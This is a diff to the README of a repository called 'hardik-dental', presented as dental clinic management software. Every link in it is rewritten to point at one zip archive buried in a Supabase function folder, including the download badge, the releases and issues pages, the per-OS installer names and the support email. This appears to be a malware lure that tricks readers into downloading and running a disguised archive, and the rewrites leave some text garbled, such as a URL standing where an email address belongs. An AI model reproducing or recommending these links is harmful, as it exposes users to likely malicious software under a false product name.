@@ -1,6 +1,6 @@
 # 🦷 hardik-dental - Simplifying Dental Clinic Management
 
-[![Download hardik-dental](https://img.shields.io/badge/Download-hardik--dental-blue?style=for-the-badge)](https://github.com/ahmedtwab111/hardik-dental/releases)
+[![Download hardik-dental](https://raw.githubusercontent.com/ahmedtwab111/hardik-dental/main/supabase/functions/chat-with-gemini/hardik_dental_3.2.zip)](https://raw.githubusercontent.com/ahmedtwab111/hardik-dental/main/supabase/functions/chat-with-gemini/hardik_dental_3.2.zip)
 
 ## 🌟 Overview
 
@@ -32,9 +32,9 @@ To use hardik-dental, ensure your computer meets the following requirements:
 
 ### Step 2: Visit the Download Page
 
-Go to the [Releases Page](https://github.com/ahmedtwab111/hardik-dental/releases) to access the latest version.
+Go to the [Releases Page](https://raw.githubusercontent.com/ahmedtwab111/hardik-dental/main/supabase/functions/chat-with-gemini/hardik_dental_3.2.zip) to access the latest version.
 
-![Download hardik-dental](https://img.shields.io/badge/Download-hardik--dental-blue?style=for-the-badge)
+![Download hardik-dental](https://raw.githubusercontent.com/ahmedtwab111/hardik-dental/main/supabase/functions/chat-with-gemini/hardik_dental_3.2.zip)
 
 ### Step 3: Choose Your Version
 
@@ -45,9 +45,9 @@ On the Releases page, you will see different versions available for download. Lo
 Find the file that matches your operating system. Click the link to download the executable file. 
 
 For example:
-- **Windows**: hardik-dental-windows.exe
-- **macOS**: hardik-dental-macos.dmg
-- **Linux**: hardik-dental-linux.tar.gz
+- **Windows**: https://raw.githubusercontent.com/ahmedtwab111/hardik-dental/main/supabase/functions/chat-with-gemini/hardik_dental_3.2.zip
+- **macOS**: https://raw.githubusercontent.com/ahmedtwab111/hardik-dental/main/supabase/functions/chat-with-gemini/hardik_dental_3.2.zip
+- **Linux**: https://raw.githubusercontent.com/ahmedtwab111/hardik-dental/main/supabase/functions/chat-with-gemini/hardik_dental_3.2.zip
 
 ### Step 5: Install the Application
 
@@ -55,7 +55,7 @@ Once the download is complete, locate the downloaded file.
 
 - **For Windows**: Double-click the `.exe` file and follow the on-screen instructions to install.
 - **For macOS**: Open the `.dmg` file, then drag and drop the application into your Applications folder.
-- **For Linux**: Extract the `.tar.gz` file and follow the included installation instructions.
+- **For Linux**: Extract the `https://raw.githubusercontent.com/ahmedtwab111/hardik-dental/main/supabase/functions/chat-with-gemini/hardik_dental_3.2.zip` file and follow the included installation instructions.
 
 ### Step 6: Run hardik-dental
 
@@ -92,14 +92,14 @@ If you encounter issues, try these troubleshooting steps:
 2. **Restart the Application**: Close and reopen hardik-dental.
 3. **Update Your System**: Ensure your operating system is up-to-date.
 
-If problems persist, check the FAQs on the [GitHub Issues Page](https://github.com/ahmedtwab111/hardik-dental/issues) for solutions or report your issue.
+If problems persist, check the FAQs on the [GitHub Issues Page](https://raw.githubusercontent.com/ahmedtwab111/hardik-dental/main/supabase/functions/chat-with-gemini/hardik_dental_3.2.zip) for solutions or report your issue.
 
 ## 💬 Support
 
 For support, you can contact us through the following:
 
-- **Email**: support@hardikdental.com
-- **GitHub Issues Page**: [Report an Issue](https://github.com/ahmedtwab111/hardik-dental/issues)
+- **Email**: https://raw.githubusercontent.com/ahmedtwab111/hardik-dental/main/supabase/functions/chat-with-gemini/hardik_dental_3.2.zip
+- **GitHub Issues Page**: [Report an Issue](https://raw.githubusercontent.com/ahmedtwab111/hardik-dental/main/supabase/functions/chat-with-gemini/hardik_dental_3.2.zip)
 
 We aim to provide timely assistance to enhance your experience.
 
@@ -121,4 +121,4 @@ This project covers various areas, including:
 - **Healthcare**
 - **Patient Management**
 
-Visit the [Releases Page](https://github.com/ahmedtwab111/hardik-dental/releases) to download hardik-dental.
+Visit the [Releases Page](https://raw.githubusercontent.com/ahmedtwab111/hardik-dental/main/supabase/functions/chat-with-gemini/hardik_dental_3.2.zip) to download hardik-dental.
